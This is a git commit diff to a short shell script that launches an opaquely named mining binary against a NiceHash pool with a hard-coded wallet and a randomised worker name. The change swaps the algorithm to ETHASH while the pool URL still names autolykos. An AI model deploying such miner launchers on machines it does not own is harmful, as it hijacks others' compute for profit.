94b2024b9f7a7efde9cbb713466dd06fbe015d67
renilo <88342640+renilo@users.noreply.github.com>
2021-10-08 20:41:32 +0700

    Update kontol.sh

--- kontol.sh
+++ kontol.sh
@@ -2,4 +2,4 @@ POOL=stratum+tcp://autolykos.eu-west.nicehash.com:3390
 WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
 WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-P)
 chmod +x memek
-./memek --algo AUTOLYKOS2 --pool $POOL --user $WALLET.P100
+./memek --algo ETHASH --pool $POOL --user $WALLET.P100
